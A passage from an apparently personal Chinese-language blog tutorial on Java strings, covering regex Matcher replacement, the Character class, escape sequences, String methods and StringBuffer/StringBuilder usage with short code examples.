appendTail 方法</h2><p>Matcher 类也提供了appendReplacement 和 appendTail 方法用于<strong>文本替换</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RegexMatches</span></span>&#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> String REGEX = <span class="string">&quot;a*b&quot;</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> String INPUT = <span class="string">&quot;aabfooaabfooabfoobkkk&quot;</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> String REPLACE = <span class="string">&quot;-&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      Pattern p = Pattern.compile(REGEX);</span><br><span class="line">      <span class="comment">// 获取 matcher 对象</span></span><br><span class="line">      Matcher m = p.matcher(INPUT);</span><br><span class="line">      StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">      <span class="keyword">while</span>(m.find())&#123;</span><br><span class="line">         m.appendReplacement(sb,REPLACE);</span><br><span class="line">      &#125;</span><br><span class="line">      m.appendTail(sb);</span><br><span class="line">      System.out.println(sb.toString());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513115842.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513115925.png"></p><h2 id="PatternSyntaxException-类的方法"><a href="#PatternSyntaxException-类的方法" class="headerlink" title="PatternSyntaxException 类的方法"></a>PatternSyntaxException 类的方法</h2><p>PatternSyntaxException 是一个非强制异常类，<strong>它指示一个正则表达式模式中的语法错误</strong>。</p><p>PatternSyntaxException 类提供了下面的方法来帮助我们查看发生了什么错误。</p><table><thead><tr><th align="left"><strong>序号</strong></th><th align="left"><strong>方法及说明</strong></th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>public String getDescription()</strong> 获取错误的描述。</td></tr><tr><td align="left">2</td><td align="left"><strong>public int getIndex()</strong>  获取错误的索引。</td></tr><tr><td align="left">3</td><td align="left"><strong>public String getPattern()</strong> 获取错误的正则表达式模式。</td></tr><tr><td align="left">4</td><td align="left"><strong>public String getMessage()</strong> 返回多行字符串，包含语法错误及其索引的描述、错误的正则表达式模式和模式中错误索引的可视化指示。</td></tr></tbody></table><h1 id="Character-类"><a href="#Character-类" class="headerlink" title="Character 类"></a>Character 类</h1><p>Character 类用于对单个字符进行操作。</p><p>Character 类在对象中包装一个基本类型 <strong>char</strong> 的值</p><p>在实际开发过程中，我们经常会遇到需要使用对象，而不是内置数据类型的情况。为了解决这个问题，Java语言为内置数据类型char提供了包装类Character类。</p><p>Character类提供了一系列方法来操纵字符。可以使用Character的构造方法创建一个Character类对象,例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Character ch = <span class="keyword">new</span> Character(<span class="string">&#x27;a&#x27;</span>);</span><br></pre></td></tr></table></figure><p>在某些情况下，Java编译器会自动创建一个Character对象。</p><p>例如，将一个char类型的参数传递给需要一个Character类型参数的方法时，那么编译器会自动地将char类型参数转换为Character对象。 这种特征称为<strong>装箱</strong>，反过来称为拆箱。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原始字符 &#x27;a&#x27; 装箱到 Character 对象 ch 中</span></span><br><span class="line">Character ch = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 原始字符 &#x27;x&#x27; 用 test 方法装箱</span></span><br><span class="line"><span class="comment">// 返回拆箱的值到 &#x27;c&#x27;</span></span><br><span class="line"><span class="keyword">char</span> c = test(<span class="string">&#x27;x&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="转义序列"><a href="#转义序列" class="headerlink" title="转义序列"></a>转义序列</h2><p>前面有反斜杠<code>\</code>的字符代表转义字符，它对编译器来说是有特殊含义的。</p><p>下面列表展示了Java的转义序列：</p><table><thead><tr><th align="left">转义序列</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">\t</td><td align="left">在文中该处插入一个tab键</td></tr><tr><td align="left">\b</td><td align="left">在文中该处插入一个后退键</td></tr><tr><td align="left">\n</td><td align="left">在文中该处换行</td></tr><tr><td align="left">\r</td><td align="left">在文中该处插入回车</td></tr><tr><td align="left">\f</td><td align="left">在文中该处插入换页符</td></tr><tr><td align="left">&#39;</td><td align="left">在文中该处插入单引号</td></tr><tr><td align="left">&quot;</td><td align="left">在文中该处插入双引号</td></tr><tr><td align="left">\</td><td align="left">在文中该处插入反斜杠</td></tr></tbody></table><p>当打印语句遇到一个转义序列时，编译器可以正确地对其进行解释。</p><p>以下实例转义双引号并输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;欢迎来到\&quot;sigma\&quot;的博客&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513182707.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513182809.png"></p><h2 id="Character-方法"><a href="#Character-方法" class="headerlink" title="Character 方法"></a>Character 方法</h2><p>下面是Character类的方法：</p><table><thead><tr><th align="left">序号</th><th align="left">方法与描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/java/character-isletter.html">isLetter()</a> 是否是一个字母</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/java/character-isdigit.html">isDigit()</a> 是否是一个数字字符</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/java/character-iswhitespace.html">isWhitespace()</a> 是否是一个空白字符</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/java/character-isuppercase.html">isUpperCase()</a> 是否是大写字母</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/java/character-islowercase.html">isLowerCase()</a> 是否是小写字母</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/java/character-touppercase.html">toUpperCase()</a> 指定字母的大写形式</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/java/character-tolowercase.html">toLowerCase</a>() 指定字母的小写形式</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/java/character-tostring.html">toString</a>() 返回字符的字符串形式，字符串的长度仅为1</td></tr></tbody></table><p>对于方法的完整列表，请参考的 <a href="https://www.runoob.com/manual/jdk11api/java.base/java/lang/Character.html">java.lang.Character API</a> 规范。</p><h1 id="String-类"><a href="#String-类" class="headerlink" title="String 类"></a>String 类</h1><p>字符串广泛应用 在 Java 编程中，在 Java 中字符串属于对象，Java 提供了 String 类来创建和操作字符串。</p><h2 id="创建字符串"><a href="#创建字符串" class="headerlink" title="创建字符串"></a>创建字符串</h2><p>创建字符串最简单的方式如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String str = <span class="string">&quot;sigma&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>在代码中遇到字符串常量时，这里的值是 <code>sigma</code>，编译器会使用该值创建一个 String 对象。</strong></p><p>和其它对象一样，可以使用关键字和构造方法来创建 String 对象。</p><p>用构造函数创建字符串：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="keyword">new</span> String(<span class="string">&quot;sigma&quot;</span>);</span><br></pre></td></tr></table></figure><p><strong>String 创建的字符串存储在公共池中，而 new 创建的字符串对象在堆上</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="string">&quot;sigma&quot;</span>;             <span class="comment">// String 直接创建</span></span><br><span class="line">String str2 = <span class="string">&quot;sigma&quot;</span>;             <span class="comment">// String 直接创建</span></span><br><span class="line">String str3 = str1;                <span class="comment">//相同引用</span></span><br><span class="line">String str4 = <span class="keyword">new</span> String(<span class="string">&quot;sigma&quot;</span>); <span class="comment">//String对象创建</span></span><br><span class="line">String str5 = <span class="keyword">new</span> String(<span class="string">&quot;sigma&quot;</span>); <span class="comment">//String对象创建 </span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/%E7%BB%98%E5%9B%BE7.png"></p><p>String 类有 11 种构造方法，这些方法提供不同的参数来初始化字符串，比如提供一个字符数组参数:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] helloArray = &#123;<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;a&#x27;</span>&#125;;</span><br><span class="line">        String helloString = <span class="keyword">new</span> String(helloArray);</span><br><span class="line">        System.out.println(helloString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513190325.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513190356.png"></p><p><strong>注意:<strong>String 类是不可改变的，所以你</strong>一旦创建了 String 对象，那它的值就无法改变了</strong>。</p><p>如果需要对字符串做很多修改，那么应该选择使用 StringBuffer &amp; StringBuilder 类。</p><h2 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h2><p>用于获取有关对象的信息的方法称为访问器方法。</p><p>String 类的一个访问器方法是<code>length()</code>方法，<strong>它返回字符串对象包含的字符数</strong>。</p><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String blog = <span class="string">&quot;https://s1gma0.github.io&quot;</span>;</span><br><span class="line">        System.out.println(blog + <span class="string">&quot;的长度是&quot;</span> + blog.length());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513191209.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513191133.png"></p><h2 id="连接字符串"><a href="#连接字符串" class="headerlink" title="连接字符串"></a>连接字符串</h2><p>String 类提供了连接两个字符串的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string1.concat(string2);     <span class="comment">//返回 string2 连接 string1 的新字符串</span></span><br></pre></td></tr></table></figure><p>也可以对<strong>字符串常量</strong>使用 concat() 方法，如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;我的博客：&quot;</span>.concat.(<span class="string">&quot;sigma&quot;</span>);</span><br></pre></td></tr></table></figure><p>更常用的是使用’+’操作符来连接字符串，如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;welcome &quot;</span> + <span class="string">&quot;to&quot;</span> + <span class="string">&quot; sigma&#x27;s&quot;</span> + <span class="string">&quot; blog&quot;</span></span><br></pre></td></tr></table></figure><p>即<img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513193420.png"></p><h2 id="创建格式化字符串"><a href="#创建格式化字符串" class="headerlink" title="创建格式化字符串"></a>创建格式化字符串</h2><p>我们知道输出格式化数字可以使用<code>printf()</code>和<code>format()</code>方法。</p><p>String 类使用静态方法<code>format()</code>返回一个String 对象而不是<code>PrintStream</code>对象。</p><p>String 类的静态方法<code>format()</code>能用来创建可复用的格式化字符串，而不仅仅是用于一次打印输出。</p><p>如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;浮点型变量的值为 &quot;</span> + <span class="string">&quot;%f，整型变量的值为 &quot;</span> + <span class="string">&quot;%d，字符串变量的值为 &quot;</span> + <span class="string">&quot;is %s&quot;</span>, floatVar, intVar, stringVar);</span><br></pre></td></tr></table></figure><p>也可以：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String fs;</span><br><span class="line">fs = String.format(<span class="string">&quot;浮点型变量的值为 &quot;</span> + <span class="string">&quot;%f, 整型变量的值为 &quot;</span> + <span class="string">&quot; %d, 字符串变量的值为 &quot;</span> + <span class="string">&quot; %s&quot;</span>, floatVar, intVar, stringVar);</span><br></pre></td></tr></table></figure><h2 id="String-方法"><a href="#String-方法" class="headerlink" title="String 方法"></a>String 方法</h2><p>下面是 String 类支持的方法，更多详细，参看 <a href="https://www.runoob.com/manual/jdk11api/java.base/java/lang/String.html">Java String API</a> 文档:</p><table><thead><tr><th align="left">SN(序号)</th><th align="left">方法描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/java/java-string-charat.html">char charAt(int index)</a> 返回指定索引处的 char 值。</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/java/java-string-compareto.html">int compareTo(Object o)</a> 把这个字符串和另一个对象比较。</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/java/java-string-compareto.html">int compareTo(String anotherString)</a> 按字典顺序比较两个字符串。</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/java/java-string-comparetoignorecase.html">int compareToIgnoreCase(String str)</a> 按字典顺序比较两个字符串，不考虑大小写。</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/java/java-string-concat.html">String concat(String str)</a> 将指定字符串连接到此字符串的结尾。</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/java/java-string-contentequals.html">boolean contentEquals(StringBuffer sb)</a> 当且仅当字符串与指定的StringBuffer有相同顺序的字符时候返回真。</td></tr><tr><td align="left">7</td><td align="left">[static String copyValueOf(char<a href="https://www.runoob.com/java/java-string-copyvalueof.html">] data)</a> 返回指定数组中表示该字符序列的 String。</td></tr><tr><td align="left">8</td><td align="left">[static String copyValueOf(char<a href="https://www.runoob.com/java/java-string-copyvalueof.html">] data, int offset, int count)</a> 返回指定数组中表示该字符序列的 String。</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/java/java-string-endswith.html">boolean endsWith(String suffix)</a> 测试此字符串是否以指定的后缀结束。</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/java/java-string-equals.html">boolean equals(Object anObject)</a> 将此字符串与指定的对象比较。</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/java/java-string-equalsignorecase.html">boolean equalsIgnoreCase(String anotherString)</a> 将此 String 与另一个 String 比较，不考虑大小写。</td></tr><tr><td align="left">12</td><td align="left">[byte<a href="https://www.runoob.com/java/java-string-getbytes.html">] getBytes()</a>  使用平台的默认字符集将此 String 编码为 byte 序列，并将结果存储到一个新的 byte 数组中。</td></tr><tr><td align="left">13</td><td align="left">[byte<a href="https://www.runoob.com/java/java-string-getbytes.html">] getBytes(String charsetName)</a> 使用指定的字符集将此 String 编码为 byte 序列，并将结果存储到一个新的 byte 数组中。</td></tr><tr><td align="left">14</td><td align="left">[void getChars(int srcBegin, int srcEnd, char<a href="https://www.runoob.com/java/java-string-getchars.html">] dst, int dstBegin)</a> 将字符从此字符串复制到目标字符数组。</td></tr><tr><td align="left">15</td><td align="left"><a href="https://www.runoob.com/java/java-string-hashcode.html">int hashCode()</a> 返回此字符串的哈希码。</td></tr><tr><td align="left">16</td><td align="left"><a href="https://www.runoob.com/java/java-string-indexof.html">int indexOf(int ch)</a> 返回指定字符在此字符串中第一次出现处的索引。</td></tr><tr><td align="left">17</td><td align="left"><a href="https://www.runoob.com/java/java-string-indexof.html">int indexOf(int ch, int fromIndex)</a> 返回在此字符串中第一次出现指定字符处的索引，从指定的索引开始搜索。</td></tr><tr><td align="left">18</td><td align="left"><a href="https://www.runoob.com/java/java-string-indexof.html">int indexOf(String str)</a>  返回指定子字符串在此字符串中第一次出现处的索引。</td></tr><tr><td align="left">19</td><td align="left"><a href="https://www.runoob.com/java/java-string-indexof.html">int indexOf(String str, int fromIndex)</a> 返回指定子字符串在此字符串中第一次出现处的索引，从指定的索引开始。</td></tr><tr><td align="left">20</td><td align="left"><a href="https://www.runoob.com/java/java-string-intern.html">String intern()</a>  返回字符串对象的规范化表示形式。</td></tr><tr><td align="left">21</td><td align="left"><a href="https://www.runoob.com/java/java-string-lastindexof.html">int lastIndexOf(int ch)</a>  返回指定字符在此字符串中最后一次出现处的索引。</td></tr><tr><td align="left">22</td><td align="left"><a href="https://www.runoob.com/java/java-string-lastindexof.html">int lastIndexOf(int ch, int fromIndex)</a> 返回指定字符在此字符串中最后一次出现处的索引，从指定的索引处开始进行反向搜索。</td></tr><tr><td align="left">23</td><td align="left"><a href="https://www.runoob.com/java/java-string-lastindexof.html">int lastIndexOf(String str)</a> 返回指定子字符串在此字符串中最右边出现处的索引。</td></tr><tr><td align="left">24</td><td align="left"><a href="https://www.runoob.com/java/java-string-lastindexof.html">int lastIndexOf(String str, int fromIndex)</a>  返回指定子字符串在此字符串中最后一次出现处的索引，从指定的索引开始反向搜索。</td></tr><tr><td align="left">25</td><td align="left"><a href="https://www.runoob.com/java/java-string-length.html">int length()</a> 返回此字符串的长度。</td></tr><tr><td align="left">26</td><td align="left"><a href="https://www.runoob.com/java/java-string-matches.html">boolean matches(String regex)</a> 告知此字符串是否匹配给定的正则表达式。</td></tr><tr><td align="left">27</td><td align="left"><a href="https://www.runoob.com/java/java-string-regionmatches.html">boolean regionMatches(boolean ignoreCase, int toffset, String other, int ooffset, int len)</a> 测试两个字符串区域是否相等。</td></tr><tr><td align="left">28</td><td align="left"><a href="https://www.runoob.com/java/java-string-regionmatches.html">boolean regionMatches(int toffset, String other, int ooffset, int len)</a> 测试两个字符串区域是否相等。</td></tr><tr><td align="left">29</td><td align="left"><a href="https://www.runoob.com/java/java-string-replace.html">String replace(char oldChar, char newChar)</a> 返回一个新的字符串，它是通过用 newChar 替换此字符串中出现的所有 oldChar 得到的。</td></tr><tr><td align="left">30</td><td align="left"><a href="https://www.runoob.com/java/java-string-replaceall.html">String replaceAll(String regex, String replacement)</a> 使用给定的 replacement 替换此字符串所有匹配给定的正则表达式的子字符串。</td></tr><tr><td align="left">31</td><td align="left"><a href="https://www.runoob.com/java/java-string-replacefirst.html">String replaceFirst(String regex, String replacement)</a>  使用给定的 replacement 替换此字符串匹配给定的正则表达式的第一个子字符串。</td></tr><tr><td align="left">32</td><td align="left">[String<a href="https://www.runoob.com/java/java-string-split.html">] split(String regex)</a> 根据给定正则表达式的匹配拆分此字符串。</td></tr><tr><td align="left">33</td><td align="left">[String<a href="https://www.runoob.com/java/java-string-split.html">] split(String regex, int limit)</a> 根据匹配给定的正则表达式来拆分此字符串。</td></tr><tr><td align="left">34</td><td align="left"><a href="https://www.runoob.com/java/java-string-startswith.html">boolean startsWith(String prefix)</a> 测试此字符串是否以指定的前缀开始。</td></tr><tr><td align="left">35</td><td align="left"><a href="https://www.runoob.com/java/java-string-startswith.html">boolean startsWith(String prefix, int toffset)</a> 测试此字符串从指定索引开始的子字符串是否以指定前缀开始。</td></tr><tr><td align="left">36</td><td align="left"><a href="https://www.runoob.com/java/java-string-subsequence.html">CharSequence subSequence(int beginIndex, int endIndex)</a>  返回一个新的字符序列，它是此序列的一个子序列。</td></tr><tr><td align="left">37</td><td align="left"><a href="https://www.runoob.com/java/java-string-substring.html">String substring(int beginIndex)</a> 返回一个新的字符串，它是此字符串的一个子字符串。</td></tr><tr><td align="left">38</td><td align="left"><a href="https://www.runoob.com/java/java-string-substring.html">String substring(int beginIndex, int endIndex)</a> 返回一个新字符串，它是此字符串的一个子字符串。</td></tr><tr><td align="left">39</td><td align="left">[char<a href="https://www.runoob.com/java/java-string-tochararray.html">] toCharArray()</a> 将此字符串转换为一个新的字符数组。</td></tr><tr><td align="left">40</td><td align="left"><a href="https://www.runoob.com/java/java-string-tolowercase.html">String toLowerCase()</a> 使用默认语言环境的规则将此 String 中的所有字符都转换为小写。</td></tr><tr><td align="left">41</td><td align="left"><a href="https://www.runoob.com/java/java-string-tolowercase.html">String toLowerCase(Locale locale)</a>  使用给定 Locale 的规则将此 String 中的所有字符都转换为小写。</td></tr><tr><td align="left">42</td><td align="left"><a href="https://www.runoob.com/java/java-string-tostring.html">String toString()</a>  返回此对象本身（它已经是一个字符串！）。</td></tr><tr><td align="left">43</td><td align="left"><a href="https://www.runoob.com/java/java-string-touppercase.html">String toUpperCase()</a> 使用默认语言环境的规则将此 String 中的所有字符都转换为大写。</td></tr><tr><td align="left">44</td><td align="left"><a href="https://www.runoob.com/java/java-string-touppercase.html">String toUpperCase(Locale locale)</a> 使用给定 Locale 的规则将此 String 中的所有字符都转换为大写。</td></tr><tr><td align="left">45</td><td align="left"><a href="https://www.runoob.com/java/java-string-trim.html">String trim()</a> 返回字符串的副本，忽略前导空白和尾部空白。</td></tr><tr><td align="left">46</td><td align="left"><a href="https://www.runoob.com/java/java-string-valueof.html">static String valueOf(primitive data type x)</a> 返回给定data type类型x参数的字符串表示形式。</td></tr><tr><td align="left">47</td><td align="left"><a href="https://www.runoob.com/java/java-string-contains.html">contains(CharSequence chars)</a> 判断是否包含指定的字符系列。</td></tr><tr><td align="left">48</td><td align="left"><a href="https://www.runoob.com/java/java-string-isempty.html">isEmpty()</a> 判断字符串是否为空。</td></tr></tbody></table><h1 id="StringBuffer-和-StringBuilder-类"><a href="#StringBuffer-和-StringBuilder-类" class="headerlink" title="StringBuffer 和 StringBuilder 类"></a>StringBuffer 和 StringBuilder 类</h1><p>当对字符串进行修改的时候，需要使用<code>StringBuffer</code>和<code>StringBuilder</code>类。</p><p>和 String 类不同的是<code>StringBuffer</code>和<code>StringBuilder</code>类的对象<strong>能够被多次的修改</strong>，并且不产生新的未使用对象。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513202740.png"></p><p>在使用 StringBuffer 类时，每次都会对 StringBuffer 对象本身进行操作，而不是生成新的对象，所以如果需要**对字符串进行修改推荐使用<code>StringBuffer</code>**。</p><p>StringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。</p><p>由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(<span class="number">10</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;Runoob..&quot;</span>);</span><br><span class="line">        System.out.println(sb);  </span><br><span class="line">        sb.append(<span class="string">&quot;!&quot;</span>);</span><br><span class="line">        System.out.println(sb); </span><br><span class="line">        sb.insert(<span class="number">8</span>, <span class="string">&quot;Java&quot;</span>);</span><br><span class="line">        System.out.println(sb); </span><br><span class="line">        sb.delete(<span class="number">5</span>,<span class="number">8</span>);</span><br><span class="line">        System.out.println(sb);  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305132040584.png"></p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513203024.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305132042442.png"></p><p>然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">      StringBuffer sBuffer = <span class="keyword">new</span> StringBuffer(<span class="string">&quot;博客网址&quot;</span>);</span><br><span class="line">      sBuffer.append(<span class="string">&quot;https://&quot;</span>);</span><br><span class="line">      sBuffer.append(<span class="string">&quot;s1gma0&quot;</span>);</span><br><span class="line">      sBuffer.append(<span class="string">&quot;.github&quot;</span>);</span><br><span class="line">      sBuffer.append(<span class="string">&quot;.io&quot;</span>);</span><br><span class="line">      System.out.println(sBuffer);  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305132047842.png"></p><p>编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305132048273.png"></p><h2 id="StringBuffer-方法"><a href="#StringBuffer-方法" class="headerlink" title="StringBuffer 方法"></a>StringBuffer 方法</h2><p>以下是 StringBuffer 类支持的主要方法：</p><table><thead><tr><th align="left">序号</th><th align="left">方法描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">public StringBuffer append(String s) 将指定的字符串追加到此字符序列。</td></tr><tr><td align="left">2</td><td align="left">public StringBuffer reverse()  将此字符序列用其反转形式取代。</td></tr><tr><td align="left">3</td><td align="left">public delete(int start, int end) 移除此序列的子字符串中的字符。</td></tr><tr><td align="left">4</td><td align="left">public insert(int offset, int i) 将 <code>int</code> 参数的字符串表示形式插入此序列中。</td></tr><tr><td align="left">5</td><td align="left">insert(int offset, String str) 将 <code>str</code> 参数的字符串插入此序列中。</td></tr><tr><td align="left">6</td><td align="left">replace(int start, int end, String str) 使用给定 <code>String</code> 中的字符替换此序列的子字符串中的字符。</td></tr></tbody></table><p>以下列表列出了 StringBuffer 类的其他常用方法：</p><table><thead><tr><th align="left">序号</th><th align="left">方法描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">int capacity() 返回当前容量。</td></tr><tr><td align="left">2</td><td align="left">char charAt(int index) 返回此序列中指定索引处的 <code>char</code> 值。</td></tr><tr><td align="left">3</td><td align="left">void ensureCapacity(int minimumCapacity) 确保容量至少等于指定的最小值。</td></tr><tr><td align="left">4</td><td align="left">void getChars(int srcBegin, int srcEnd, char[] dst, int dstBegin) 将字符从此序列复制到目标字符数组 <code>dst</code>。</td></tr><tr><td align="left">5</td><td align="left">int indexOf(String str) 返回第一次出现的指定子字符串在该字符串中的索引。</td></tr><tr><td align="left">6</td><td align="left">int indexOf(String str, int fromIndex) 